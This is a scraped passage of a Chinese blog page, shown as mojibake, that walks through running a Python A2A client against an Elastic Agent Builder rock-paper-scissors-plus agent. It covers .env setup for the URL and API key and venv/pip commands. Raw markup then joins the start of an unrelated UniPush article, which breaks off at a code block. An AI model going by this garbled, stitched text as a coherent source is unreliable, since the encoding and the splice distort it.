<p>åœ¨ Visual Studio æ–‡ä»¶èµ„æºç®¡ç†å™¨ä¸­ï¼Œå±•å¼€ supporting-blog-content å’Œ agent-builder-a2a-strands-agents æ–‡ä»¶å¤¹ï¼Œç„¶åæ‰“å¼€æ–‡ä»¶ elastic_agent_builder_a2a_rps+.pyã€‚æ–‡ä»¶åœ¨ Visual Studio Code ä¸­æ‰“å¼€åå¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9dbfb508e717421e896c2aa2dc82a2b9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766457388&amp;x-signature=geDFwJ204raLFy7CxYfPeVhoDok%3D" alt="" loading="lazy"/></p>
<p>ä»¥ä¸‹æ˜¯ä½ åœ¨æ–‡æœ¬ç¼–è¾‘å™¨ä¸­åº”è¯¥çœ‹åˆ°çš„ elastic_agent_builder_a2a_rps+.py æ–‡ä»¶å†…å®¹ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">`

1.  import asyncio
2.  from dotenv import load_dotenv
3.  from uuid import uuid4
4.  import httpx
5.  import os
6.  import random
7.  from a2a.client import A2ACardResolver, ClientConfig, ClientFactory
8.  from a2a.types import Message, Part, Role, TextPart

<span class="hljs-attr">10.  DEFAULT_TIMEOUT</span> = <span class="hljs-number">60</span>  <span class="hljs-comment"># set request timeout to 1 minute</span>

13.  def create_message(*, role: <span class="hljs-attr">Role</span> = Role.user, text: str, context_id=None) -&gt; Message:
14.      return Message(
<span class="hljs-attr">15.          kind</span>=<span class="hljs-string">"message"</span>,
<span class="hljs-attr">16.          role</span>=<span class="hljs-string">"user"</span>,
<span class="hljs-attr">17.          parts</span>=[Part(TextPart(kind=<span class="hljs-string">"text"</span>, text=text))],
<span class="hljs-attr">18.          message_id</span>=uuid4().hex,
<span class="hljs-attr">19.          context_id</span>=context_id,
20.      )

23.  async def main():
24.      load_dotenv()
<span class="hljs-attr">25.      a2a_agent_host</span> = os.getenv(<span class="hljs-string">"ES_AGENT_URL"</span>)
<span class="hljs-attr">26.      a2a_agent_key</span> = os.getenv(<span class="hljs-string">"ES_API_KEY"</span>)
<span class="hljs-attr">27.      custom_headers</span> = {<span class="hljs-string">"Authorization"</span>: f<span class="hljs-string">"ApiKey {a2a_agent_key}"</span>}

29.      async with httpx.AsyncClient(
<span class="hljs-attr">30.          timeout</span>=DEFAULT_TIMEOUT, headers=custom_headers
31.      ) as httpx_client:
32.          <span class="hljs-comment"># Get agent card</span>
<span class="hljs-attr">33.          resolver</span> = A2ACardResolver(httpx_client=httpx_client, base_url=a2a_agent_host)
<span class="hljs-attr">34.          agent_card</span> = await resolver.get_agent_card(
<span class="hljs-attr">35.              relative_card_path</span>=<span class="hljs-string">"/rps_plus_agent.json"</span>
36.          )
37.          <span class="hljs-comment"># Create client using factory</span>
<span class="hljs-attr">38.          config</span> = ClientConfig(
<span class="hljs-attr">39.              httpx_client</span>=httpx_client,
<span class="hljs-attr">40.              streaming</span>=<span class="hljs-literal">True</span>,
41.          )
<span class="hljs-attr">42.          factory</span> = ClientFactory(config)
<span class="hljs-attr">43.          client</span> = factory.create(agent_card)
44.          <span class="hljs-comment"># Use the client to communicate with the agent</span>
45.          print("\nSending 'start game' message to Elastic A2A agent...")
<span class="hljs-attr">46.          random_game_object</span> = random.randint(<span class="hljs-number">1</span>, <span class="hljs-number">5</span>)
<span class="hljs-attr">47.          msg</span> = create_message(text=f<span class="hljs-string">"start with game object {random_game_object}"</span>)
48.          async for event in client.send_message(msg):
49.              if isinstance(event, Message):
<span class="hljs-attr">50.                  context_id</span> = event.context_id
<span class="hljs-attr">51.                  response_complete</span> = event.parts[<span class="hljs-number">0</span>].root.text
52.                  <span class="hljs-comment"># Get agent choice from the first line of the response</span>
<span class="hljs-attr">53.                  parsed_response</span> = response_complete.split(<span class="hljs-string">"\n"</span>, <span class="hljs-number">1</span>)
<span class="hljs-attr">54.                  agent_choice</span> = parsed_response[<span class="hljs-number">0</span>]
55.                  print(parsed_response<span class="hljs-section">[1]</span>)
56.          <span class="hljs-comment"># User choice sent for game results from the agent</span>
<span class="hljs-attr">57.          prompt</span> = input(<span class="hljs-string">"Your Choice  : "</span>)
<span class="hljs-attr">58.          msg</span> = create_message(text=prompt, context_id=context_id)
59.          async for event in client.send_message(msg):
60.              if isinstance(event, Message):
61.                  print(f"Agent Choice : {agent_choice}")
62.                  print(event.parts<span class="hljs-section">[0]</span>.root.text)

65.  if <span class="hljs-attr">__name__</span> == <span class="hljs-string">"__main__"</span>:
66.      asyncio.run(main())

`AIå†™ä»£ç !<span class="hljs-section">[]</span>(https://csdnimg.cn/release/blogv2/dist/pc/img/runCode/icon-arrowwhite.png)æ”¶èµ·ä»£ç å—!<span class="hljs-section">[]</span>(https://csdnimg.cn/release/blogv2/dist/pc/img/arrowup-line-top-White.png)
</code></pre>
<p>è®©æˆ‘ä»¬æ¥å›é¡¾ä¸€ä¸‹è¿™æ®µä»£ç çš„ä½œç”¨ã€‚ä» main() æ–¹æ³•å¼€å§‹ï¼Œä»£ç é¦–å…ˆè®¿é—® agent URL å’Œ API Key çš„ç¯å¢ƒå˜é‡ã€‚ç„¶åæˆ‘ä»¬ä½¿ç”¨è¿™äº›å€¼åˆ›å»ºä¸€ä¸ª httpx å®¢æˆ·ç«¯ï¼Œç”¨äºè·å–è¯¥ agent çš„ agent cardã€‚å®¢æˆ·ç«¯éšåä½¿ç”¨ agent card çš„è¯¦ç»†ä¿¡æ¯å‘ agent å‘é€ â€œstart gameâ€ è¯·æ±‚ã€‚è¿™é‡Œæœ‰ä¸€ä¸ªæœ‰è¶£çš„åœ°æ–¹æ˜¯ï¼Œæˆ‘ä»¬åœ¨ â€œstart gameâ€ è¯·æ±‚ä¸­åŒ…å«äº† random_game_object å€¼ã€‚è¿™ä¸ªå€¼æ˜¯ä½¿ç”¨ Python æ ‡å‡†åº“çš„ random æ¨¡å—ç”Ÿæˆçš„éšæœºæ•°ã€‚è¿™æ ·åšçš„åŸå› æ˜¯ï¼Œå¼ºå¤§çš„ LLMï¼ˆä½¿ AI agent æˆä¸ºå¯èƒ½ï¼‰åœ¨ç”Ÿæˆéšæœºæ€§æ–¹é¢è¡¨ç°ä¸ä½³ã€‚æ²¡é—®é¢˜ï¼ŒPython æ¥æ•‘åœºã€‚</p>
<p>ç»§ç»­ä»£ç ï¼Œå½“ agent å“åº” â€œstart gameâ€ è¯·æ±‚åï¼Œä»£ç ä¼šæå– agent çš„æ¸¸æˆå¯¹è±¡é€‰æ‹©ï¼Œå¹¶å°†å…¶ä¿å­˜åœ¨ agent_choice å˜é‡ä¸­ã€‚å…¶ä½™çš„å“åº”å†…å®¹ä»¥æ–‡æœ¬å½¢å¼æ˜¾ç¤ºç»™æœ€ç»ˆç”¨æˆ·ã€‚ç„¶åæç¤ºç”¨æˆ·è¾“å…¥ä»–ä»¬çš„æ¸¸æˆå¯¹è±¡é€‰æ‹©ï¼Œå¹¶å°†å…¶å‘é€ç»™ agentã€‚ä»£ç éšåæ˜¾ç¤º agent çš„æ¸¸æˆå¯¹è±¡é€‰æ‹©ä»¥åŠ agent å¯¹æ¸¸æˆç»“æœçš„æœ€ç»ˆåˆ¤æ–­ã€‚</p>
<h2 data-id="heading-7">å°† agent URL å’Œ API Key è®¾ç½®ä¸ºç¯å¢ƒå˜é‡</h2>
<p>ç”±äºç¤ºä¾‹åº”ç”¨å°†åœ¨æœ¬åœ°ç”µè„‘ä¸Šè¿è¡Œï¼Œä¸ºäº†ä¸æˆ‘ä»¬çš„ Agent Builder agent é€šä¿¡ï¼Œæˆ‘ä»¬éœ€è¦ä¸º Strands Agents SDK æä¾› agent çš„ A2A URL å’Œ API Keyã€‚ç¤ºä¾‹åº”ç”¨ä½¿ç”¨åä¸º .env çš„æ–‡ä»¶æ¥å­˜å‚¨è¿™äº›å€¼ã€‚</p>
<p>å¤åˆ¶ env.example æ–‡ä»¶ï¼Œå¹¶å°†æ–°æ–‡ä»¶å‘½åä¸º .envã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/763b1ca501654248a0a0276d02f951b0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766457388&amp;x-signature=bvBH8uTNDNKkmAMJV73o7gD0LV4%3D" alt="" loading="lazy"/></p>
<p>è¿”å› Elastic Agent Builderï¼Œæˆ‘ä»¬å¯ä»¥åœ¨è¿™é‡Œè·å–æ‰€éœ€çš„ä¸¤ä¸ªå€¼ã€‚</p>
<p>ä»é¡µé¢å³ä¸Šè§’çš„ Agent Builder actions èœå•ä¸­é€‰æ‹© <strong>View all tools</strong>ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e2d658c959d7434d926b1cbfa643131f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766457388&amp;x-signature=IcqL%2FsByh7TZw2ea%2FUT%2FkZhuH4A%3D" alt="" loading="lazy"/></p>
<p>ç‚¹å‡» Tools é¡µé¢é¡¶éƒ¨çš„ MCP Server ä¸‹æ‹‰èœå•ï¼Œå¹¶é€‰æ‹© Copy MCP Server URLã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5d592dee70764e1ab0add80017647311~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766457388&amp;x-signature=wbzVMyPz5OuD4CnNtjG7xeV%2BY0Y%3D" alt="" loading="lazy"/></p>
<p>å°† MCP Server URL ç²˜è´´åˆ° .env æ–‡ä»¶ä¸­ï¼Œæ›¿æ¢Â <strong/> å ä½ç¬¦ã€‚ç°åœ¨æˆ‘ä»¬éœ€è¦å¯¹ URL åšä¸€ä¸ªä¿®æ”¹ï¼Œå³å°†ç»“å°¾çš„ â€œmcpâ€ æ›¿æ¢ä¸º â€œa2aâ€ï¼Œå› ä¸º Strands Agents SDK å°†ä½¿ç”¨ <a href="https://link.juejin.cn?target=https%3A%2F%2Fa2a-protocol.org%2F" title="https://a2a-protocol.org/" target="_blank" ref="nofollow noopener noreferrer">A2A åè®®</a>ä¸è¿è¡Œåœ¨ Elastic Agent Builder ä¸­çš„ agent é€šä¿¡ã€‚</p>
<p>ä¿®æ”¹åçš„ URL åº”è¯¥ç±»ä¼¼è¿™æ ·ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">`https://rps-game-project-12345a.kb.us-east-1.aws.elastic.cloud/api/agent_builder/a2a`AIå†™ä»£ç 
</code></pre>
<p>æˆ‘ä»¬åœ¨ Elastic Cloud ä¸­è¿˜éœ€è¦è·å–å¦ä¸€ä¸ªå€¼ â€”â€” API Keyã€‚ç‚¹å‡»é¡¶å±‚å¯¼èˆªä¸­çš„ Elasticsearchã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/99e06fdc288c463691c3e3e8798786f1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766457388&amp;x-signature=M35GlEN9UdWP478IjJZe3Mn95GE%3D" alt="" loading="lazy"/></p>
<p>ç‚¹å‡» Copy API Key æŒ‰é’®å¤åˆ¶ API Keyã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/895e5561acdc4772b4cef6b258445f19~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766457388&amp;x-signature=qAMx%2B6Pcry9EgdsFE%2Bhjuk%2BsjxM%3D" alt="" loading="lazy"/></p>
<p>ç°åœ¨å›åˆ° Visual Studio Codeï¼Œåœ¨ .env æ–‡ä»¶ä¸­ç²˜è´´ API Keyï¼Œæ›¿æ¢ <strong/> å ä½ç¬¦æ–‡æœ¬ã€‚ä½ çš„ .env æ–‡ä»¶åº”ç±»ä¼¼å¦‚ä¸‹ï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/40e611adbc874a02a2cf1b02b021d378~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766457388&amp;x-signature=Iwij59c8OjdlB3DUGYKjNCd8Zy4%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-8">è¿è¡Œç¤ºä¾‹åº”ç”¨</h2>
<p>åœ¨ Visual Studio Code ä¸­æ‰“å¼€ä¸€ä¸ªæ–°ç»ˆç«¯ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9ca6ca135b3e46c384700808ec34006b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766457388&amp;x-signature=mvGa2uF9tr0ziA0hJDBfHDIxsCw%3D" alt="" loading="lazy"/></p>
<p>é¦–å…ˆåœ¨ç»ˆç«¯ä¸­è¿è¡Œä»¥ä¸‹ cd å‘½ä»¤ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">`<span class="hljs-built_in">cd</span> elasticsearch-labs/supporting-blog-content/agent-builder-a2a-strands-agents`AIå†™ä»£ç 
</code></pre>
<p>è¿è¡Œä»¥ä¸‹å‘½ä»¤ä»¥åˆ›å»º Python è™šæ‹Ÿç¯å¢ƒã€‚</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-string">`python -m venv .venv`</span>AIå†™ä»£ç 
</code></pre>
<p>æ ¹æ®ä½ æœ¬åœ°ç”µè„‘çš„æ“ä½œç³»ç»Ÿï¼Œè¿è¡Œä»¥ä¸‹å‘½ä»¤æ¥æ¿€æ´»è™šæ‹Ÿç¯å¢ƒã€‚</p>
<ul>
<li>MacOS/Linux</li>
</ul>

<pre><code class="hljs language-bash" lang="bash">`<span class="hljs-built_in">source</span> .venv/bin/activate`AIå†™ä»£ç 
</code></pre>
<ul>
<li>Windows</li>
</ul>

<pre><code class="hljs language-r" lang="r">`.venv\Scripts\activate`AIå†™ä»£ç 
</code></pre>
<p>ç¤ºä¾‹åº”ç”¨ä½¿ç”¨ Strands Agents SDKï¼Œç°åœ¨æˆ‘ä»¬åœ¨æœ¬æ•™ç¨‹ä¸­éœ€è¦å®‰è£…å®ƒã€‚è¿è¡Œä»¥ä¸‹å‘½ä»¤å®‰è£… Strands Agents SDK åŠå…¶æ‰€æœ‰å¿…éœ€çš„ Python åº“ä¾èµ–ã€‚</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-string">`pip install -r requirements.txt`</span>AIå†™ä»£ç 
</code></pre>
<p>æ˜¯æ—¶å€™æ¸…ç†å‘å°„å¹³å°å¹¶å¼€å§‹å€’è®¡æ—¶äº†ã€‚æˆ‘ä»¬å‡†å¤‡å¥½å¯åŠ¨è¿™ä¸ªåº”ç”¨ã€‚åé€€ä¸€æ­¥ã€‚ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤è¿è¡Œå®ƒï¼š</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-string">`python elastic_agent_builder_a2a_rps+.py`</span>AIå†™ä»£ç 
</code></pre>
<p>ä½ åº”è¯¥ä¼šè¿æ¥ä¸€åœº RPS+ æ¸¸æˆã€‚å¹²å¾—å¥½ï¼Œç¥ä½ å¥½è¿ï¼</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d82240f7964140ecbf371022f215f060~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766457388&amp;x-signature=EIM%2FG82mftB%2BYa0NMEupOOu8yNw%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-9">ç”¨ç›¸å…³ä¸Šä¸‹æ–‡æ„å»ºä½ çš„ AI åº”ç”¨</h2>
<p>æ„å»º AI Agent ç°åœ¨å·²æˆä¸ºä½ çš„æŠ€èƒ½å·¥å…·ä¹‹ä¸€ã€‚ä½ å·²ç»çœ‹åˆ°ï¼Œé€šè¿‡ A2A ä½¿ç”¨ Elastic Builder agent åœ¨åƒ Strands Agents SDK è¿™æ ·çš„ agent å¼€å‘æ¡†æ¶ä¸­æ˜¯å¤šä¹ˆå®¹æ˜“ã€‚å°è¯•<a href="https://link.juejin.cn?target=https%3A%2F%2Fcloud.elastic.co%2Fregistration%3Futm_source%3Dagentic-ai-category%26utm_medium%3Dsearch-labs%26utm_campaign%3Dagent-builder" title="https://cloud.elastic.co/registration?utm_source=agentic-ai-category&amp;utm_medium=search-labs&amp;utm_campaign=agent-builder" target="_blank" ref="nofollow noopener noreferrer">ä½¿ç”¨ Elastic</a> æ„å»ºä¸è‡ªå®šä¹‰æ•°æ®ç›¸å…³ä¸Šä¸‹æ–‡ç›¸è¿æ¥çš„ AI agentã€‚</p>
<p>åŸæ–‡ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fsearch-labs%2Fblog%2Fagent-builder-a2a-strands-agents-guide" title="https://www.elastic.co/search-labs/blog/agent-builder-a2a-strands-agents-guide" target="_blank" ref="nofollow noopener noreferrer">www.elastic.co/search-labsâ€¦</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[UniPush 2.0 å®æˆ˜æŒ‡å—ï¼šå·¥å•æé†’ä¸å¤šå‚å•†é€šé“é…ç½®]]></title>    <link>https://juejin.cn/post/7583955708318351360</link>    <guid>https://juejin.cn/post/7583955708318351360</guid>    <pubDate>2025-12-16T02:53:55.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583955708318351360" data-draft-id="7583921477614518307" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="UniPush 2.0 å®æˆ˜æŒ‡å—ï¼šå·¥å•æé†’ä¸å¤šå‚å•†é€šé“é…ç½®"/> <meta itemprop="keywords" content="å‰ç«¯,JavaScript"/> <meta itemprop="datePublished" content="2025-12-16T02:53:55.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="hellsing"/> <meta itemprop="url" content="https://juejin.cn/user/4433705584572302"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            UniPush 2.0 å®æˆ˜æŒ‡å—ï¼šå·¥å•æé†’ä¸å¤šå‚å•†é€šé“é…ç½®
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4433705584572302/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    hellsing
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T02:53:55.000Z" title="Tue Dec 16 2025 02:53:55 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">1. æ–¹æ¡ˆé€‰å‹ä¸æ¶æ„ç­–ç•¥</h2>
<h3 data-id="heading-1">1.1 äº‘æœåŠ¡å•†é€‰æ‹©ï¼šæ¨èè…¾è®¯äº‘</h3>
<p>åœ¨ uniCloud çš„æœåŠ¡å•†é€‰æ‹©ä¸Šï¼Œé’ˆå¯¹ä¼ä¸šçº§é¡¹ç›®ï¼ˆå°¤å…¶æ˜¯æ¶‰åŠåˆ°å·¥å•ã€é¢„è­¦ç­‰éœ€è¦ç¨³å®šæ¨é€çš„åœºæ™¯ï¼‰ï¼Œæ¨èé€‰æ‹© <strong>è…¾è®¯äº‘</strong>ã€‚</p>
<ul>
<li><strong>æ ¸å¿ƒä¼˜åŠ¿</strong>ï¼šå¼€å¯â€œäº‘å‡½æ•° URL åŒ–â€æ—¶ï¼Œè…¾è®¯äº‘<strong>ä¸éœ€è¦</strong>é‡æ–°è¿›è¡ŒåŸŸåå¤‡æ¡ˆï¼ˆICPå¤‡æ¡ˆï¼‰ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨è…¾è®¯äº‘æä¾›çš„é»˜è®¤åŸŸåã€‚</li>
<li><strong>æˆæœ¬è€ƒé‡</strong>ï¼šè™½ç„¶å•ä»·ç•¥é«˜äºé˜¿é‡Œäº‘ï¼Œä½†çœå»äº†ç¹ççš„è¡Œæ”¿å¤‡æ¡ˆæµç¨‹ï¼Œå¯¹äºé¡¹ç›®å¿«é€Ÿä¸Šçº¿å’Œç»´æŠ¤æä¸ºæœ‰åˆ©ã€‚</li>
</ul>
<h3 data-id="heading-2">1.2 æ ¸å¿ƒä¸šåŠ¡æµç¨‹</h3>
<p>æˆ‘ä»¬éœ€è¦å®ç°çš„æ˜¯â€œç‚¹å¯¹ç‚¹â€çš„å·¥å•é€šçŸ¥ï¼Œæ ¸å¿ƒé€»è¾‘å¦‚ä¸‹ï¼š</p>
<ol>
<li><strong>å‰ç«¯ï¼ˆAPPç«¯ï¼‰</strong> ï¼šç”¨æˆ·ç™»å½•åï¼Œè·å–è®¾å¤‡çš„ <code>push_clientid</code>ã€‚</li>
<li><strong>ç»‘å®šå…³ç³»</strong>ï¼šå‰ç«¯è°ƒç”¨äº‘å‡½æ•°æˆ–æ¥å£ï¼Œå°† <code>user_id</code> ä¸ <code>push_clientid</code> å­˜å…¥ <code>uni-id-device</code> è¡¨ä¸­ï¼ˆå»ºç«‹ç”¨æˆ·ä¸è®¾å¤‡çš„æ˜ å°„ï¼‰ã€‚</li>
<li><strong>åç«¯è§¦å‘</strong>ï¼šç”±äºå·¥å•çŠ¶æ€å˜æ›´é€šå¸¸å‘ç”Ÿåœ¨åå°ï¼ˆJava/Python/Goç­‰ï¼‰ï¼Œåç«¯é€šè¿‡ HTTP è¯·æ±‚è°ƒç”¨ <strong>äº‘å‡½æ•° URL åŒ–æ¥å£</strong>ã€‚</li>
<li><strong>äº‘å‡½æ•°æ‰§è¡Œ</strong>ï¼šäº‘å‡½æ•°æ ¹æ®ä¼ å…¥çš„ <code>user_id</code> æŸ¥åº“æ‰¾åˆ° CIDï¼Œè°ƒç”¨ <code>uniPush</code> ä¸‹å‘æ¶ˆæ¯ã€‚</li>
</ol>
<hr/>
<h2 data-id="heading-3">2. äº‘å‡½æ•°å®ç°ï¼ˆCore Codeï¼‰</h2>
<p>æ­¤äº‘å‡½æ•°ä½œä¸ºç»Ÿä¸€çš„æ¨é€å…¥å£ï¼Œå¤„ç†äº†è®¾å¤‡æŸ¥æ‰¾å’Œå¤šå‚å•†å‚æ•°é€‚é…ã€‚</p>
<p>JavaScript</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-meta">'use strict'</span>;
